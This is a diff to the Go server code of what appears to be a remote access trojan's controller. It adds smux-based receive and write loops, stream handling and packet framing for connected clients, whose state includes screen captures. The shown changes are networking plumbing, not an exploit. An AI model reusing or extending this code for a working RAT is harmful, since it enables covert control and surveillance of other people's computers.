@@ -3,10 +3,11 @@ package main
 import (
 	"encoding/base64"
 	"encoding/binary"
+	"io"
 	"math/rand"
 	"net"
+	"rat/command/log"
 	"rat/shared"
-	"rat/shared/network"
 	"rat/shared/network/header"
 
 	"strconv"
@@ -20,11 +21,9 @@ import (
 type listenerMap map[header.PacketHeader]*websocket.Conn
 
 type Client struct {
-	network.Writer
-	network.Reader
-
-	Conn   net.Conn
-	stream *smux.Stream
+	session *smux.Session
+	Conn    net.Conn
+	stream  *smux.Stream
 
 	Id int
 
@@ -44,7 +43,8 @@ type Client struct {
 		Buffer    []byte
 	}
 
-	Queue chan OutgoingPacket
+	Queue      chan Outgoing
+	streamChan chan Channel
 
 	Listeners listenerMap
 
@@ -56,7 +56,8 @@ type Client struct {
 func NewClient(conn net.Conn) *Client {
 	client := new(Client)
 
-	client.Queue = make(chan OutgoingPacket)
+	client.Queue = make(chan Outgoing)
+	client.streamChan = make(chan Channel)
 
 	client.Conn = conn
 	client.Id = int(rand.Int31())
@@ -66,6 +67,56 @@ func NewClient(conn net.Conn) *Client {
 	client.Monitors = make([]shared.Monitor, 0)
 
 	return client
+}
+
+func (c *Client) recvLoop() {
+	var err error
+	for {
+		h, err := c.ReadHeader()
+
+		if err != nil {
+			break
+		}
+
+		var n int32
+		err = binary.Read(c.stream, shared.ByteOrder, &n)
+		buf := make([]byte, n)
+		io.ReadFull(c.stream, buf)
+
+		packet := GetIncomingPacket(h)
+
+		packet, err = packet.Decode(buf)
+
+		if err != nil {
+			break
+		}
+
+		packet.OnReceive(c)
+	}
+
+	log.Println("remove", err.Error())
+	removeClient(c)
+}
+
+func (c *Client) writeLoop() {
+	for {
+		select {
+		case ch := <-c.streamChan:
+			stream, _ := c.session.OpenStream()
+			c.WriteHeader(ch.Header(), true)
+			go ch.Open(stream, c)
+		case p := <-c.Queue:
+			c.WriteHeader(p.Header(), false)
+			p.Write(c)
+		}
+	}
+}
+
+func (c Client) Close() error {
+	close(c.Queue)
+	close(c.streamChan)
+	c.stream.Close()
+	return c.Conn.Close()
 }
 
 func (c *Client) GetDisplayHost() string {
@@ -143,18 +194,14 @@ func (c *Client) ReadHeader() (header.PacketHeader, error) {
 	return h, err
 }
 
-func (c *Client) WriteHeader(header header.PacketHeader) error {
-	return binary.Write(c.stream, shared.ByteOrder, header)
-}
-
-func (c *Client) WritePacket(packet OutgoingPacket) error {
-	err := c.WriteHeader(packet.Header())
+func (c *Client) WriteHeader(header header.PacketHeader, channel bool) error {
+	err := binary.Write(c.stream, shared.ByteOrder, header)
 
 	if err != nil {
 		return err
 	}
 
-	return c.Writer.WritePacket(packet)
+	return binary.Write(c.stream, shared.ByteOrder, channel)
 }
 
 // GetEncodedScreen returns a base64 encoded version of the most recent screenshot
